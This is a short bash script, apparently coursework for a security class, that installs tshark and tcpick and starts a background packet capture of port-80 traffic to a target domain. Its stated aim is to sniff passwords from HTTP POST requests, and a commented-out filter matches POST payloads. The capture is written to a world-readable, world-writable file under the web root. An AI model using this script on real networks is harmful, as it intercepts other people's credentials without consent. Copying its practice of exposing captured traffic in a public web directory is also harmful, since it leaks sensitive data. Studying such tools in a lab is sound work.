#!/bin/bash
#=============================================================
# A simple shell script to start tshark and sniff the network
# Attempts to sniff out http-post password
# ----
# Note: Run this script with sudo privilege
#=============================================================

# Read in domain of targeted website
DOMAIN=$1

# Read in IP address of targeted website
HOST_IP=$(ping -c1 $DOMAIN | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')

# Check if tshark and tcpick is installed, if not install
if command -v tshark >/dev/null 2>&1 ; then
    echo "tshark found"
else
    echo "tshark not found, initiating download"
    sudo apt --assume-yes install tshark
fi

if command -v tcpick >/dev/null 2>&1 ; then
    echo "tcpick found"
else
    echo "tcpick not found, initiating download"
    sudo apt --assume-yes install tcpick
fi

# Setting up output file
FILE=/var/www/html/cs3235/scripts/capture-output.pcapng
if test -f "$FILE"; then
    #output file exists
    rm $FILE
fi
touch /var/www/html/cs3235/scripts/capture-output.pcapng
chmod a+rw /var/www/html/cs3235/scripts/capture-output.pcapng

# Start tshark
sudo tshark -i enp0s3 -w $FILE -f "host $HOST_IP and port 80" > /dev/null 2>&1 &
#sudo tshark -i enp0s3 -w $FILE -f "host 204.15.135.8 and port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354 and tcp[((tcp[12:1] & 0xf0) >> 2) + 4:1] = 0x20" > /dev/null 2>&1 &
